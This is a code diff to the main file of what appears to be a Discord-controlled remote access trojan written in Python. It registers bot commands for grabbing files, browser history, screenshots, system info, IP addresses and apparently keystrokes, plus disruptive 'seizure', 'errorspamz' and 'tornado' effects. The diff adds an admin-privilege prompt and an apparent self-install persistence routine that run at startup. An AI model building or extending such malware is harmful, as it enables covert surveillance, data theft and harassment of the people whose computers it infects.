@@ -2,7 +2,12 @@ import discord
 from discord.ext import commands
 import discodd
 import info
-from command import ip_command, playsound_command, errorspamz_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
+from command import ip_command, close_command, tts_command, admin_command, blur_command, playsound_command, errorspamz_command, screenswipe_command, tornado_command, seizure_command, clean_command, lp_command, tree_command, getfiles_command, kp_command, getbrowserhistory_command, share_command, sysinfo_command, screenshot_command
+import startuplogic.askadmin
+import startuplogic.addme
+
+startuplogic.askadmin.setup()
+startuplogic.addme.run_setup_in_thread()
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='.', intents=intents)
@@ -27,7 +32,6 @@ async def check_channel(ctx):
     allowed_channel_id = bot.allowed_channel_ids.get(ctx.guild.id)
     return allowed_channel_id is None or ctx.channel.id == allowed_channel_id
 
-# Adding commands from the command module
 bot.add_command(commands.Command(ip_command.ip, name='ip'))
 bot.add_command(commands.Command(clean_command.clean, name='clean'))
 bot.add_command(commands.Command(lp_command.lp, name='lp'))
@@ -43,4 +47,9 @@ bot.add_command(commands.Command(tornado_command.tornado, name='tornado'))
 bot.add_command(commands.Command(screenswipe_command.screenswipe, name='screenswipe'))
 bot.add_command(commands.Command(errorspamz_command.errorspamz, name='errorspamz'))
 bot.add_command(commands.Command(playsound_command.playsound, name='playsound'))
+bot.add_command(commands.Command(blur_command.blur_command, name='blur'))
+bot.add_command(commands.Command(admin_command.admin_command, name='admin'))
+bot.add_command(commands.Command(tts_command.speak_command, name='speak'))
+bot.add_command(commands.Command(close_command.close_command, name='close'))
+
 bot.run(discodd.TOKEN)
